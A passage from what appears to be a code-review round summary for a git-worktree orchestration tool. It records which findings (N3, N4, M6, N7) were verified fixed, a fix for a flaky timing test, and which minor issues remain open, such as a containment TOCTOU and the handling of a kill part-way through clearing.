  - A present, deliberately locked worktree is still reported, as GRILL G4 intends.
- **N3 — verified-fixed (docs).**
  - Wording: "the original argv MINUS the flags the question replaces", with `--tests` named for
    `tests-unresolved`.
  - Probed: an explicit `--gates` never reaches `no-gates` (an empty token → `child-refused`).
- **N4 — recorded.** BUILD.md carries a note, and its history is left as written.
- **M6 — narrowed-ok.** The Residual's reason is corrected: `REGISTRY` already holds per-stage
  vocabularies, and the real cost of closing it is two more parity-pinned copies. It is still deferred,
  on P7 alone.
- **N7 — NEW, found this round; verified-fixed.**
  - GRILL G4's render promises that "the next fresh start removes the leftover worktree". For G4's own
    LOCKED leftover it failed `git-failed` (measured), because the fresh start's single `--force` left a
    locked registration behind.
  - The same helper fixes it, and the G4 test now runs that next start to `done`.
  - Either call site alone clears it, so the red-turning edit is dropping both (measured).
- **Added so the A3 fix is reachable.** The command now routes a Bash-tool timeout to one `--resume`, and
  its "a kill before drain-head → `no-progress`" line excepts a kill inside "fresh"'s first moments.
- **A test timing flake, fixed.** Round 1's SIGKILL test killed after a fixed 800 ms. It now waits for the
  install to start; the 3-run repeat and the full suite are green.

### Still open (all minor, advisory)

- **N5.** A5's round-trip tests take the option from `REGISTRY` and substitute through a local helper,
  instead of using the emitted object's `options` and the shipped `substituteArgv`.
- **The containment TOCTOU (A4's residual).** Containment is walked once at an invocation's start, and the
  writes come up to about 570 s later. It is unchanged, and not introduced by any round.
- **A kill mid-clear.** A kill inside "fresh" before its scratch clear (or mid-`clearBaseWorktree` of a
  previous run's leftover) can leave an earlier run's record for a `--resume` to revive. That is the N1
  residual, now named in the command and the contract.
- **Recurrence of the lesson candidate.** This round's own new claims were probed before they were
  written: the explicit-`--gates` sentence, "either call site alone", the clock, and the kill-mid-`add`
  resume.
